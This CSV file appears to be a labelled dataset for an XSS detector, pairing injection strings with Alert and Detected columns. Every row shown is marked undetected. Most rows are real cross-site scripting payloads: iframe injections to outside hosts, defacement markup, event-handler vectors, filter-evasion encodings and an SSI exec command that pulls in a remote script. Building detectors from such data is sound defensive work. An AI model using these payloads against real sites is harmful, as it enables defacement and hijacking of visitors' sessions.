Payload,Alert,Detected
"pt=2&sp=2&ycs=%2BqWEgB7wUAc%3D&qs=06oENya4ZGJbKUjvjwGtnG6lv5viRy7eDPDTOS9W-A4i5B6Eb7<br/>wQL9rBk7gdfqacjQNjjI_Y_0zI2HHPHI08-huHhEzofZpLPMhLhvaj5ooN2zseleNY6O_aj70yQKP2VHFm7L9aSLVEiZBsYMZPIY<br/>spfNlRjvRJdccPwIl6fnT-tg_KnijcoEzGTu_Zbr_5vQSskeF9LpJGrntRRV4B3eFvvnzduHjUySH30QNgAngpVqXKdXE5P8-Y2N<br/>qO6iHrw07J6s1gh0yxpw8vHhHLfMaUy5ZdBzR0yyYgLX0Q..,YT0z&vid=1206254279_1X01X1826228314&rpt=2&kt=1",False,0
http&next=http%3A%2F%2Fxssed.com,False,0
ID='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E<br/>%3Cmarquee%3EWhiteHat%20Forever%3C/marque%3E,False,0
nID=register;lID=1,False,0
"<style>:target {transform: rotate(180deg);}</style><figure id=x style=""transition:transform 2s"" ontransitionrun=print()></figure>",False,0
email_user='%3E%22%3E%3Ciframe%20src=http://kusomiso.com/xss<br/>.html%20%3C,False,0
lang=es-EN&updatelang=1&next=http%3A//xssed.com,False,0
url=%0AContent-Type:%20text/html%0AContent-Length:16%0A%0Atest......<br/>......,False,0
id=Arama,False,0
q=%22%3E%3Ch1%3E%3Cmarquee%3E---+XSSED+---%3C%2Fmarq<br/>uee%3E%3C%2Fh1%3E&c=193&Submit.x=0&Submit.y=0&Submit=Go%21,False,0
"<style>:target {transform: rotate(180deg);}</style><ul id=x style=""transition:transform 2s"" ontransitionrun=print()></ul>",False,0
keyword=%3Ciframe%20src=http://www.google.com<br/>%3E%3C/iframe%3E,False,0
NRMODE=Published&NRNODEGUID=%7bA85<br/>F8395-EC74-4CE7-AFBB-2251E8AD8772%7d&NRORIGINALURL=%2fSearch&NRCACHEHINT=Guest,False,0
hata=1&CID=%3ch1%3ehacked%20by%20CiCoSz%20%3c/<br/>h1%3e,False,0
t=p&d=syneu&s=ps&c=wg&l=dir&o=0&sv=0a300589&ip=5512c9a9&id=D14365C8527A655E4F3<br/>EAFC2ADB6972A&q=googlebig&p=1&qs=121&ac=24&g=5b16ks+WgFG6Yi&en=te&io=0&b=alg&tp=d&ec=10&pt=GoogleBig<br/>&ex=&url=&u=http://www.googlebig.com,False,0
nats=%22%3E%3Ciframe%20src=http://pc-kopat.us/hac<br/>ked/%3E,False,0
"url=noticia.php?id=<iframe src=""http://xssed.com"">",False,0
type=endsite_box&Keywords=%27%22%3E%3Ciframe%20src=http://xs<br/>sed.com%3E,False,0
search_mode=1&keyword=%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com<br/>%22%3E&imgfSearch.x=19&imgfSearch.y=10,False,0
file=http://www.gabbyattic.com/jokes/put%20down%20th<br/>e%20gun.mp3&autoStart=false&songVolume=90,False,0
achtelfinale';al<br/>ert('Airroxssed');',False,0
dateyear=%3Ciframe%20src=%22http://xssed.com/%22%3E,False,0
email-id=2&layout=%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
"<input name=""username"" value=""admin"" />",False,0
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://.rocks/.js></SCRIPT>'""",False,0
<img  sr%00c=x o%00nerror=((pro%00mpt(1)))>,False,0
ontransitioncancel,False,0
user=PHNjcmlwdD5hbGVydCgvbm8gb25lIGNhbiBjYXRjaCBtZS<br/>EgSVJTREwgaXMgaGVyZSEgQnVnUmVwb3J0LmlyIS8pPC9zY3JpcHQ+JTIzaDg=,False,0
urlext1=http<br/>://www.google.com,False,0
q=%3Ciframe+src%3D%27http%3A%2F%2Fxssed.com%2F%27%3E%3C%2Fiframe%3Eporn,False,0
nats=%22%3E%3Ciframe%20src=http://pc-kop<br/>at.us/hacked/%3E,False,0
__VIEWSTATE=%2FwEPDwUJNzU4ODAzMzAzD2QWAgIDD2QWAgIHDw8WAh4EV<br/>GV4dAUnJyI%2BPC90aXRsZT48c2NyaXB0PmFsZXJ0KDEzMzcpPC9zY3JpcHQ%2BZGRkbbuKPsA8lkS70Y4KlOrS5DdV4Ek%3D&tx<br/>tInput=JyI%2BPC90aXRsZT48c2NyaXB0PmFsZXJ0KDEzMzcpPC9zY3JpcHQ%2B&BtnDecrypt=Base64+To+Normal+String&_<br/>_EVENTVALIDATION=%2FwEWBALrpN2aDQKT8abSBwL0m%2F3IBgLdnbn1CV5E2cqKCYC4w3ifuv3%2BzkupEgMd,False,0
lid=ch_big5&tid=default&f_user=&six=&f_email=<br/>=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/if<br/>rame%3E,False,0
<x %6Fnxxx=1,False,0
Page=%3Ch1%3E%20ITS%20INSECURE%20LOL%20<br/>%3CH1%3E%3Cnoscript%3E%00&NavBar=off,False,0
"<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>",False,0
page=-1&userid=&subject=%22%3E%3Ciframe%20src=http://www.g<br/>oogle.com%3E%3C/iframe%3E&act=&hjgColor=,False,0
K=%3Ch1%3ENiKo19+Was+Here%3C%2Fh1%3E&ppid=53804&Submit=Search,False,0
site=kari&type=large&id=%22%3E%3Ciframe%20src=http://pc-kopa<br/>t.us/hacked/%3E,False,0
window.name='AnonKryptiQuz';location.replace('about:blank');,False,0
id=15933&url=http://www.xssed.com,False,0
lid=es&tid=aleborg&f_user=&six=&f_email=http://www.auto<br/>komis-styl.pl/webmail/index.php?lid=pl&tid=hungi.mozilla&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%20<br/>Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
"xss'""><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>",False,0
LANGID=30&<br/>MENU=CALC,False,0
URL=http://pc-kopat.us/hacked/,False,0
onDrop,False,0
"module=news&action=show&n=38""-><iframe src=""http://www.google.com""<br/>width=400 height=300>&lang=uk",False,0
t=noticia&cod=-4%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
message='%22%3E%3Ciframe%20src=http://xssed.com%3E,False,0
q=%22%3E%3Ch1%3EXSS%3C%2Fh1%3E%3Cmarquee%3E%3Ca+href%3D%22&absch<br/>icken=Search&lang=2,False,0
<xss:xss>XSS</xss:xss>,False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=<br/>com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http://<br/>www.google.com/search?hl=en&q=hacked+By+aamooshy&btnG=Search,False,0
id=forskningssider%22%3E%3Cframe%20name=%22a%22%20src=%22http://google<br/>.com%22%3E,False,0
"-(a=alert,b=""_Y000!_"",[b].find(a))-'",False,0
sok=ja,False,0
url=http://www.xssed.com/archive/author=0rijin4l/,False,0
ii=82&go=http://vuln.xssed.net/thirdparty/scripts/pytho<br/>n5.html,False,0
year=%22%3E%3Ciframe%20src=%22http://xssed.com%22<br/>%3E,False,0
view=0&sid=N6piGBVidWyJAW1XuSXw8QABAAAAAAAA,False,0
onFocusIn,False,0
genre=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzor<br/>g%3C/h1%3E%3C/marquee%3E,False,0
userid=%3Ch1%3EUBUR%20XSS%20LOL%3Ch1%3E,False,0
tipo=main&rg=todas&nb=%27%22%3E%3E%3Cmarquee%3E<br/>%3Ch1%3E%3Cstrong%3E%3Ci%3Ecueballr%3C%2Fi%3E%3C%2Fstrong%3E%3C%2Fh1%3E%3C%2Fmarquee%3E&submit2.x=26<br/>&submit2.y=8,False,0
ds_url=http%3a%3bh4F%3b%3bh4F%3bwww.r3t.n3t.nl%3bh<br/>4F%3bportal%3bh4F%3bLinkDireto%3bh4F%3bgo2.jsp%3bh5F%3bpage%3bh3D%3bSMARTPHONES&cd_space=8&cd_space_<br/>type=1003&cd_entity=88810&cd_guide=-1&cd_field=-1&id_entity=2&n=2,False,0
mode=DoIt,False,0
url=%22%3E%3Ch1%3ERoMeO%20|%20DarkMindZ%3C/h1%3E%3Ciframe%20s<br/>rc=http://xssed.com%3E,False,0
KONTO=%22%3E%3Ciframe%20src=http://www.google.<br/>de%3E,False,0
returnUrl=http://xssed.com/,False,0
"tag=""><marquee>XSSed</marquee>",False,0
"<style>:target {transform: rotate(180deg);}</style><image id=x style=""transition:transform 2s"" ontransitionrun=print()></image>",False,0
&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;,False,0
<svg/onload=%26%23097lert%26lpar;1337)>,False,0
content=2705&SearchForm=true&CFID=10975790&CFTOKEN=44489244&jsessio<br/>nid=f0309bb983d576bd754b44703c4f5b4e6859,False,0
"exp/*<A STYLE='no\xss:noxss(""*//*"");",False,0
&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;,False,0
s=_3G80MWNH4&id=449&EiRegistration=4WC02JSPM,False,0
No=%22%3E%3Ciframe%20src=/%3E%3C/iframe%3E,False,0
"<img src=""http://www.vulnerability-lab.com/file.php?variables=malicious"">",False,0
template=53&sortspec=%22%3E%3Ciframe%20src=%22http://x<br/>ssed.com%22%3E,False,0
"chballsite=1&query=""<marquee>XSSed_bY_SaMTHG</marquee>",False,0
nats='%22%3E%3Ciframe<br/>%20src=http://pc-kopat.us/hacked/%3E,False,0
<body onpopstate=print()>,False,0
ID=1049&URL=http://vuln.xssed.net/thirdparty/scripts/python5.h<br/>tml,False,0
city=%3Ciframe%20src=%22http://xssed.com%22%3EPATIALA&<br/>display=N,False,0
"<a/href=""ja%0d%0avascr%0di%0apt:window['axlxexrt’ replace(/x/,"")]()"">CLICK ME",False,0
"aModele=afficheN&cpsidt=""><iframe%20src=http://xssed.com>",False,0
<base href=//0>,False,0
"<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>",False,0
url=http://xss.skyr3x.us,False,0
wd=%22%3E%3Cmarquee%3Edefaced+by+sponsfull%3C%2Fmarquee%3E,False,0
opensocial_authtype=SIGNED&opensocial_token=at4IjkedDpNL<br/>kau5F/gsmGfqlODuP0eDpTeA45xoUKlXsVUjcvGcAmS+BLRbO8M3617chfI29VFFwiTjqSbfr3RlRYrivuZjLK2V2b+FCUA=&ope<br/>nsocial_url=http://xssed.com,False,0
"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>",False,0
page='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E<br/>%3Cmarquee%3EWhiteHat%20Forever%3C/marque%3E,False,0
onResize,False,0
q2=%22%3Cp%3E%3Cb%3E%3Cfont+size%3D%227%22%3ELink+Matrix+Also<br/>+Love+With+Hacking-GURUS+he+he+he%3C%2Ffont%3E%3C%2Fb%3E%3C%2Fp%3E&mode=suchen_ausfueren&send=Linkma<br/>trix-Search,False,0
doit=1&keywords=%22%3E%3Ciframe+src%3D%22xssed.org%22%3E&Search.x=<br/>0&Search.y=0,False,0
"'`""><*chr*script>log(*num*)</script>",False,0
